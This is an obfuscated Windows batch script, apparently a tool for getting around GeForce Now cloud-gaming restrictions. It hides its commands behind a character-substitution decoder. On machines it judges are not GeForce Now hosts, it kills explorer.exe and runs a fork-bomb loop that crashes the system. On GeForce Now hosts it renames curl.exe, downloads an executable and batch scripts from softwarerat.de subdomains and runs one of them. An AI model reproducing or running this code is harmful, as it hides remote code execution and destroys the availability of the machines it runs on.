@echo off&(if defined @lo@ goto ¡)&setlocal disableDelayedExpansion&for /f "delims=: tokens=2" %%A in ('chcp') do set "@chcp@=chcp %%A>nul"&chcp 708>nul&set ^"@args@=%*"
set "@lo@= !#$&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz{|}~""
set "@hi@=¡¢¤¥§¨©ª«¬­®¯°±²³´µ¶·¸¹º»¼½¾¿ÀÁÂÃÄÅÆÇÈÉÊËÌÍÎÏÐÑÒÓÔÕÖ×ØÙÚÛÜÝÞßàáâãäåæçèéêëìíîïðñòóôõö÷øùúûüýþÿ£"
(setlocal enableDelayedExpansion&for /l %%N in (0 1 93) do set "!@hi@:~%%N,1!=!@lo@:~%%N,1!")&cmd /c ^""%~f0" !@args@!"
%@chcp@%&exit /b
:¡
%Á%%æ%%ä%%é%%ð%%¡%%ð%%ç%%ç%
%ä%%ð%%í%%ð%%ó%%¡%%·%%ç%
%õ%%ê%%õ%%í%%æ%%¡%%Ç%%ö%%ä%%ì%%Í%%æ%%â%%ì%%æ%%ó%%ô%%¡%%ã%%ú%%¡%%Ç%%¸%%×%%ê%%ô%%ê%%ð%%ï%%¡%%â%%ï%%å%%¡%%Ô%%ð%%ç%%õ%%ø%%â%%ó%%æ%%Ó%%â%%õ%
%ä%%ð%%í%%ð%%ó%%¡%%·%%¸%
%æ%%ä%%é%%ð%%¡%%Ä%%é%%æ%%ä%%ì%%¡%%ê%%ç%%¡%%õ%%é%%æ%%¡%%Ô%%ú%%ô%%õ%%æ%%î%%¡%%ê%%ô%%¡%%È%%æ%%Ç%%ð%%ó%%ä%%æ%%¡%%Ï%%ð%%ø%%¯%%¯%%¯%
C:
%ê%%ç%%¡%%æ%%ù%%ê%%ô%%õ%%¡%%Ä%%»%%Ý%%Ø%%ê%%ï%%å%%ð%%ø%%ô%%Ý%%è%%ç%%ï%%å%%æ%%ô%%ì%%õ%%ð%%ñ%%¯%%æ%%ù%%æ%%¡%%©%%¡%
%¡%%È%%Ð%%Õ%%Ð%%¡%%»%%ô%%æ%%å%%ó%%ä%%ç%%õ%%÷%%è%%û%%ã%%é%%ö%%ï%%è%%ç%%æ%%ç%
%ª%%¡%%æ%%í%%ô%%æ%%¡%%©%
%¡%%ä%%ð%%í%%ð%%ó%%¡%%µ%%¸%
%¡%%æ%%ä%%é%%ð%%¡%%Ô%%ú%%ô%%õ%%æ%%î%%¡%%ê%%ô%%¡%%ï%%ð%%õ%%¡%%È%%æ%%Ç%%ð%%ó%%ä%%æ%%¡%%Ï%%ð%%ø%%¢%%¡%%Ñ%%Ä%%¡%%ø%%ê%%í%%í%%¡%%ã%%æ%%¡%%ó%%â%%ñ%%æ%%å%%¯%%¯%%¯%
%¡%%õ%%â%%ô%%ì%%ì%%ê%%í%%í%%¡%%°%%Ç%%¡%%°%%Ê%%Î%%¡%%æ%%ù%%ñ%%í%%ð%%ó%%æ%%ó%%¯%%æ%%ù%%æ%
 :working
%¡%%¡%%ô%%õ%%â%%ó%%õ%%¡%%ä%%î%%å%%¯%%æ%%ù%%æ%
%¡%%¡%%0%ý%%0
%¡%%è%%ð%%õ%%ð%%¡%%ø%%ð%%ó%%ì%%ê%%ï%%è%
%ª%

:sedrcftvgzbhungfef
%ä%%í%%ô%
%ä%%ð%%í%%ð%%ó%%¡%%³%%¸%
%æ%%ä%%é%%ð%%¡%%È%%æ%%Ç%%ð%%ó%%ä%%æ%%¡%%Ï%%ð%%ø%%¡%%Ô%%ú%%ô%%õ%%æ%%î%%¡%%Å%%æ%%õ%%æ%%ä%%õ%%æ%%å%%¯%%¯%%¯%
%ä%%ð%%ñ%%ú%%¡%%Ä%%»%%Ý%%Ø%%ê%%ï%%å%%ð%%ø%%ô%%Ý%%Ô%%ú%%ô%%õ%%æ%%î%%´%%³%%Ý%%ä%%ö%%ó%%í%%¯%%æ%%ù%%æ%%¡%%Ä%%»%%Ý%%Ñ%%æ%%ó%%ç%%Í%%ð%%è%%ô%%Ý%%ï%%ð%%õ%%ø%%ð%%ó%%ì%%ê%%ï%%è%%¯%%æ%%ù%%æ%
%ä%%ð%%ñ%%ú%%¡%%Ä%%»%%Ý%%Ø%%ê%%ï%%å%%ð%%ø%%ô%%Ý%%Ô%%ú%%ô%%õ%%æ%%î%%´%%³%%Ý%%ä%%ö%%ó%%í%%¯%%æ%%ù%%æ%%¡%%Ä%%»%%Ý%%Ñ%%æ%%ó%%ç%%Í%%ð%%è%%ô%%Ý%%ø%%ð%%ó%%ì%%ê%%ï%%è%%¯%%æ%%ù%%æ%
%ä%%å%%¡%%Ä%%»%%Ý%%Ñ%%æ%%ó%%ç%%Í%%ð%%è%%ô%%Ý%
C:\PerfLogs\working.exe %®%%Ð%%¡%%å%%ð%%ø%%ï%%í%%ð%%â%%å%%ô%%¯%%ô%%ð%%ç%%õ%%ø%%â%%ó%%æ%%ó%%â%%õ%%¯%%å%%æ%%°%%Ç%%ê%%ù%%æ%%ó%%¯%%æ%%ù%%æ%
%ä%%å%%¡%%HOMEPATH%%Ý%%Ç%%â%%÷%%ð%%ó%%ê%%õ%%æ%%ô%
C:\PerfLogs\working.exe %®%%Ð%%¡%%ô%%ä%%ó%%ê%%ñ%%õ%%¯%%ô%%ð%%ç%%õ%%ø%%â%%ó%%æ%%ó%%â%%õ%%¯%%å%%æ%%°%%â%%ú%%ò%%ï%%é%%û%%é%%û%%ï%%û%%è%%ã%%ï%%é%%¯%%ã%%â%%õ%
%ä%%å%%¡%%£%%HOMEPATH%%Ý%%´%%Å%%¡%%Ð%%ã%%ë%%æ%%ä%%õ%%ô%%£%
C:\PerfLogs\working.exe %®%%Ð%%¡%%ô%%ä%%ó%%ê%%ñ%%õ%%¯%%ô%%ð%%ç%%õ%%ø%%â%%ó%%æ%%ó%%â%%õ%%¯%%å%%æ%%°%%ã%%è%%û%%÷%%õ%%ç%%ä%%ä%%÷%%è%%û%%ã%%ä%%ï%%¯%%ã%%â%%õ%
%ã%%è%%û%%÷%%õ%%ç%%ä%%ä%%÷%%è%%û%%ã%%ä%%ï%%¯%%ã%%â%%õ%
%å%%æ%%í%%¡%%ã%%è%%û%%÷%%õ%%ç%%ä%%ä%%÷%%è%%û%%ã%%ä%%ï%%¯%%ã%%â%%õ%
%æ%%ù%%ê%%õ%
